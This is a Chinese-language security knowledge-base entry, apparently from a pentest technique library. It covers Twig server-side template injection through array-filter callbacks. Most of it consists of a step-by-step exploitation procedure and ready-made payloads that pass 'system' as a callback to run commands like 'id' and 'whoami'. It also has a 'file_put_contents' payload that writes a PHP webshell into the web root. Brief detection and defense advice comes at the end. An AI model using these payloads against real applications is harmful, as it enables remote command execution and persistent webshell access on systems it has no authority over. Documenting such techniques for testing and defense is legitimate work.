---
id: web-generic-ssti-twig-filter-map-reduce-callback-rce
title: Twig SSTI：filter/map/reduce/sort 过滤器回调 system 实现命令执行与写文件
type: scenario
domain: web
path: web/generic/ssti
technique: twig-filter-callback-rce
aliases:
- Twig SSTI
- Twig filter system
- Twig map system
- Twig reduce RCE
- Twig 回调 RCE
- Twig file_put_contents
tags:
- ssti
- php
- twig
- filter
- map
- reduce
- callback
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V1
  verified_at: '2026-11-04T21:53:23+08:00'
  notes: 已对照原文与图片核对；回调字符串可用性依赖 Twig 配置/沙箱，未在真实环境验证
---

## 一句话结论

Twig 的 `filter`、`map`、`reduce`、`sort` 等数组过滤器允许传入可调用函数名；当目标未启用严格沙箱或允许回调字符串时，传 `system`、`passthru`、`file_put_contents` 等 PHP 函数即可对数组元素执行命令或写文件。

## 原理

Twig 模板默认运行在沙箱中，禁止直接调用 `system()`/`eval()` 等危险函数，但数组过滤器接受“回调”参数：

- `filter(callback)`：对数组元素逐个调用回调，保留返回真值的元素；
- `map(callback)`：对每个元素调用回调并返回结果数组；
- `reduce(callback, initial)`：用回调归约数组；
- `sort(callback)`：用回调比较/处理元素。

如果回调参数允许字符串函数名，且该函数未被 Twig 的沙箱/安全策略禁用，模板就会调用 PHP 原生函数。把数组元素设为命令、回调设为 `system`，`map` 即对命令执行并返回输出；`filter` 同理。`file_put_contents` 可写 webshell，配合 `map` 的键值数组形式。

Twig 3.x 删除了 `_self` 对象，但过滤器回调这条路仍取决于应用配置（是否允许回调字符串、是否启用 sandbox、`Twig\Extension\SandboxExtension` 策略）。

## 触发条件

- 应用把用户输入作为 Twig 模板源码渲染（`$twig->render($user_input)` 或 `createTemplate`）；
- Twig 未启用严格沙箱，或沙箱策略允许 `filter`/`map`/`reduce` 的回调字符串；
- PHP 环境存在 `system`/`passthru`/`file_put_contents` 等函数且未被 `disable_functions` 禁用；
- 目标有命令执行/文件写权限。

## 利用步骤

1. 用 `{{7*7}}` 或 `{{"a"|upper}}` 确认 Twig 与过滤器可用；
2. 尝试 `{{["id"]|map("system")|join(",")}}`；若被沙箱拦截，换 `filter`/`reduce`/`sort`；
3. 写 webshell：`{{{"<?php ... ?>":"/var/www/html/shell.php"}|map("file_put_contents")}}`；
4. 无回显时用 `system` 的输出拼接、DNS/HTTP 外带或写文件后访问；
5. 若回调被限制，尝试其他过滤器/函数或 Twig 版本特定链。

## PoC

```twig
{{ ["whoami"] | filter("system") }}
```

```twig
{{ ["id; uname -a"] | map("system") }}
```

```twig
{{ ["whoami"] | reduce("system") }}
```

```twig
{{["id"]|map("system")|join(",")}}
{{["id", 0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0, 0]|reduce("system", "id")|join(",")}}
```

写文件：

```twig
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
```

## 变体与关联

- 过滤器变体：`filter`、`map`、`reduce`、`sort`；不同 Twig 版本对回调字符串的支持不同。
- 函数变体：`system`、`passthru`、`exec`、`shell_exec`、`file_put_contents`、`assert` 等（受 `disable_functions`/沙箱限制）。
- 版本变体：Twig 3.x 删除 `_self` 后，传统 `_self.env.registerUndefinedFilterCallback` 链失效，但过滤器回调路径仍可能可用。
- 关联：Smarty SSTI、Jinja2 SSTI；同属模板引擎“回调/过滤器”导致的代码执行。

## 检测与防御

- 检测：模板中出现 `|filter(`、`|map(`、`|reduce(`、`|sort(` 且参数为 `system`/`passthru`/`file_put_contents`；Web 目录出现新 PHP 文件。
- 防御：不要渲染用户可控模板；启用 Twig sandbox 并禁止回调字符串；`disable_functions` 禁用危险函数；限制模板目录写权限；升级 Twig。
- 注意：Twig 默认沙箱不等于绝对安全，配置不当（允许回调/未启用 sandbox）时仍可 RCE。
